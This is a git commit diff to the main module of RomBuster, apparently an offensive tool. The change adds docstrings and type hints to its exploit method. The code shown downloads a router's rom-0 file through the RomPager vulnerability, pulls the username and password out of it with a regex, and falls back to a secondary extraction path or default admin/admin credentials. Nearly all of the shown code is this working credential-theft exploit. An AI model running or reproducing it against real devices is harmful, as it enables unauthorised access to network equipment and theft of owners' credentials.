a1900766aa32f5355047a1e38cee944a37ce3bec
Ivan Nikolsky <enty8080@gmail.com>
2022-05-29 23:35:44 +0300

    Update __main__.py

--- rombuster/__main__.py
+++ rombuster/__main__.py
@@ -34,8 +34,21 @@ from .trigger import Trigger
 
 
 class RomBuster(String):
+    """ Main class of rombuster module.
+
+    This main class of rombuster module is intended in providing
+    an exploit for RomPager vulnerability that extracts credentials
+    from the obtained rom-0 file.
+    """
+
     @staticmethod
-    def exploit(address):
+    def exploit(address: str) -> tuple:
+        """ Exploit the vulnerability in RomPager and extract credentials.
+
+        :param str address: target device address
+        :return tuple: tuple of username and password
+        """
+
         try:
             response = requests.get(
                 f"http://{address}/rom-0",
@@ -50,12 +63,13 @@ class RomBuster(String):
             password = re.findall("([\040-\176]{5,})", result)
             if len(password):
                 return username, password[0]
+
         except Exception:
             trigger = Trigger(address.split(':')[0])
             username, password = trigger.extract_credentials()
 
             if username is None and password is None:
-                return None
+                return None, None
 
             if not username and not password:
                 return 'admin', 'admin'
